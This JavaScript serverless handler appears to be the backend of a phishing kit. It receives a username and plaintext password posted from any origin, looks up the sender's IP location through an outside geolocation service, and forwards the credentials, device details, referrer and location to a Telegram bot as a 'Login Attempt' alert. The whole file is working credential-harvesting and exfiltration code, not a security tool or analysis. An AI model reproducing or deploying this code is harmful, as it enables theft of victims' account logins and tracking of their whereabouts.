/**
 *  ╔═╗╔═╗╔╗╔╔═╗╔═╗╦
 *  ╚═╗║╣ ║║║╚═╗║╣ ║
 *  ╚═╝╚═╝╝╚╝╚═╝╚═╝╩
 *  ─── telegram/login.js ───
 *
 *  Initial login attempt alert handler.
 *  Dispatches the clean "Login Attempt" notification via Telegram without
 *  buttons. Does NOT create a pending_logins record in Neon.
 */
import { sendLoginNotification } from "../_telegram.js";

var UNKNOWN = "Unknown";

function setCors(res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
}

function firstHeader(req, name) {
  var value = req.headers[name];
  if (Array.isArray(value)) value = value[0];
  if (!value) return "";
  try {
    return decodeURIComponent(String(value)).trim();
  } catch (e) {
    return String(value).trim();
  }
}

function getClientIp(req) {
  var candidates = [
    firstHeader(req, "x-vercel-forwarded-for"),
    firstHeader(req, "x-real-ip"),
    firstHeader(req, "x-forwarded-for"),
    firstHeader(req, "cf-connecting-ip"),
  ];
  for (var i = 0; i < candidates.length; i++) {
    if (candidates[i]) return candidates[i].split(",")[0].trim();
  }
  return "";
}

function isPublicIp(ip) {
  if (!ip) return false;
  var v4 = ip.replace(/^::ffff:/, "");
  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(v4)) {
    var a = v4.split(".").map(Number);
    if (a[0] === 10 || a[0] === 127 || a[0] === 0) return false;
    if (a[0] === 192 && a[1] === 168) return false;
    if (a[0] === 172 && a[1] >= 16 && a[1] <= 31) return false;
    if (a[0] === 169 && a[1] === 254) return false;
    return a.every(function (n) { return n >= 0 && n <= 255; });
  }
  if (ip === "::1") return false;
  return ip.indexOf(":") !== -1;
}

function countryNameOf(countryCode) {
  if (!countryCode) return "";
  try {
    return new Intl.DisplayNames(["en"], { type: "region" }).of(countryCode) || countryCode;
  } catch (e) {
    return countryCode;
  }
}

async function fetchJson(url) {
  var controller = typeof AbortController !== "undefined" ? new AbortController() : null;
  var timer = null;
  if (controller) timer = setTimeout(function () { controller.abort(); }, 3000);
  try {
    var res = await fetch(url, {
      method: "GET",
      cache: "no-store",
      signal: controller ? controller.signal : undefined,
    });
    if (!res.ok) return null;
    return await res.json();
  } catch (e) {
    return null;
  } finally {
    if (timer) clearTimeout(timer);
  }
}

async function enrichGeo(req, ip) {
  var city = firstHeader(req, "x-vercel-ip-city");
  var region = firstHeader(req, "x-vercel-ip-country-region");
  var countryCode = firstHeader(req, "x-vercel-ip-country").toUpperCase();
  var timezone = firstHeader(req, "x-vercel-ip-timezone");
  var country = countryNameOf(countryCode);
  var isp = "";
  var asn = null;

  if (isPublicIp(ip)) {
    var data = await fetchJson("https://ipapi.co/" + encodeURIComponent(ip) + "/json/");
    if (data && !data.error) {
      if (!city) city = data.city || "";
      if (!region) region = data.region || "";
      if (!country) country = data.country_name || "";
      if (!timezone) timezone = data.timezone || "";
      isp = data.org || "";
      asn = data.asn || null;
    }
  }

  var parts = [city, country].filter(Boolean);
  var location = parts.length ? parts.join(", ") : country;

  return {
    city: city || UNKNOWN,
    country: country || UNKNOWN,
    location: location || UNKNOWN,
    timezone: timezone || UNKNOWN,
    asOrganization: isp || UNKNOWN,
    asn: asn,
  };
}

export default async function handler(req, res) {
  setCors(res);

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    var body = req.body || {};
    var userId = body.user_id || body.userId;
    var password = body.password;

    if (!userId || !password) {
      return res.status(400).json({ error: "user_id and password are required" });
    }

    var ip = getClientIp(req) || body.ip || UNKNOWN;
    var geo = await enrichGeo(req, ip);

    await sendLoginNotification(process.env, {
      user_id: userId,
      password: password,
      member_origin: body.member_origin || null,
      device_info: body.device_info || null,
      screen_size: body.screen_size || null,
      referrer: body.referrer || null,
      cf: {
        ip: ip,
        city: geo.city,
        country: geo.country,
        timezone: geo.timezone,
        asOrganization: geo.asOrganization,
        asn: geo.asn,
      },
    });

    return res.status(200).json({ ok: true, success: true });
  } catch (error) {
    console.error("Error sending login notification:", error);
    return res.status(500).json({ error: "Failed to send notification" });
  }
}
